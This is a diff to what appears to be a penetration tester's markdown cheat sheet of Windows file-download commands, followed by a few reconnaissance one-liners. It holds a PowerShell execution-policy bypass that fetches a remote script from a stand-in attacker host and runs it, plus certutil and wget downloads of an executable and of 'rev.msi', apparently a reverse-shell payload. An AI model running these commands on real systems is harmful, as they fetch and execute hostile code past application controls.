@@ -21,10 +21,10 @@
 #### AppLocker is an application whitelisting technology introduced with Windows 7
   
 #### win downlaod file
-      powershell.exe -ep bypass; iex​(New-Object Net.WebClient).DownloadString('http://YOUR_IP/xx')
+      powershell.exe -ep bypass; IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/xx')
       curl http://xxx/xx -o xx
       certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
-      powershell wget http://10.10.16.16:8000/rev.msi -outfile xxx
+      powershell -c wget http://10.10.16.16xx/xx -outfile xxx
       
   >net accounts    /login policy
   >Write-Output "${env:COMPUTERNAME}"  //get computername
